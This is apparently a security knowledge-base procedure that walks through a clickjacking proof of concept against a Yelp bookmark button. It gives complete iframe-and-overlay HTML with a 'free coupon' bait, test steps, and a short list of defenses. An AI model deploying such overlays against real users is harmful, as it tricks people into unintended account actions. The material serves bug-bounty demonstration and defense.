---
tags:
  - clickjacking
  - ui-redressing
  - poc
  - yelp
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[User Execution]]'
updated_at: '2025-12-14T17:28:04.407Z'
skill_level: novice
impact_level: low
detection_risk: low
sub_techniques: []
id: 6bb6587c-1f5e-4333-9802-6c9f3f55c2a3
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[User Execution]]'
---
# Demonstrate-Clickjacking-POC-for-Bookmarking-Manipulation

## Summary

This procedure creates a proof-of-concept (PoC) to demonstrate how an attacker can use clickjacking to overlay elements on a vulnerable Yelp page, tricking authenticated users into bookmarking arbitrary restaurants.

## Description

The PoC embeds the vulnerable Yelp page in an iframe and uses CSS positioning to place a transparent overlay over the bookmark button. A visible bait element lures the user to click, which actually interacts with the hidden bookmark functionality. This was shown in a video PoC in the original report, highlighting low-severity UI redressing where users perform unintended actions like saving unwanted restaurants.

## Requirements

1. Vulnerable Yelp page URL confirmed
2. Basic HTML/CSS knowledge
3. Web browser for testing
4. Optional: Screen recording tool for PoC video

## Defense

Defensive measures and detection strategies:

- Enforce strict frame-ancestors CSP to block unauthorized iframes
- Add JavaScript frame-busting code as fallback
- Educate users on suspicious overlays and verify actions
- Log and alert on anomalous user interactions

## Objectives

1. Embed the target page and align overlay with bookmark element
2. Simulate user deception to trigger the action
3. Capture evidence of successful manipulation

## Instructions

### Step 1: Build the Overlay HTML

**Context**: Construct the PoC page with iframe and positioned overlay to capture clicks on the bookmark button.

Create an HTML file with the following structure, adjusting pixel offsets based on the Yelp page layout (inspect elements to find coordinates):

```html
<!DOCTYPE html>
<html>
<head>
<title>Clickjacking PoC</title>
<style>
  body { margin: 0; position: relative; }
  iframe { position: absolute; top: 0; left: 0; border: none; }
  .bait { position: absolute; top: 100px; left: 100px; z-index: 10; background: red; color: white; padding: 10px; }
  .overlay { position: absolute; top: 200px; left: 300px; width: 100px; height: 30px; z-index: 5; background: transparent; }
</style>
</head>
<body>
  <iframe src="https://www.yelp.com/[restaurant-url]" width="1200" height="800"></iframe>
  <div class="bait">Click for free coupon!</div>
  <div class="overlay"></div>
</body>
</html>
```

The overlay should cover the bookmark button; clicking the bait will hit the overlay, simulating the click.

**Expected Output**: Overlay aligns with bookmark button when iframe loads.

### Step 2: Test and Record PoC

**Context**: Load the PoC in a browser while logged into Yelp, then demonstrate the click trick.

Open the HTML file, ensure the user is authenticated on Yelp (in another tab), and click the bait. Verify the restaurant gets bookmarked in the Yelp account.

Record a video showing the full interaction to prove the deception.

**Expected Output**: Unintended bookmark appears in user's Yelp saved items.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[User Execution]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- clickjacking-poc
- overlay-manipulation
- user-deception
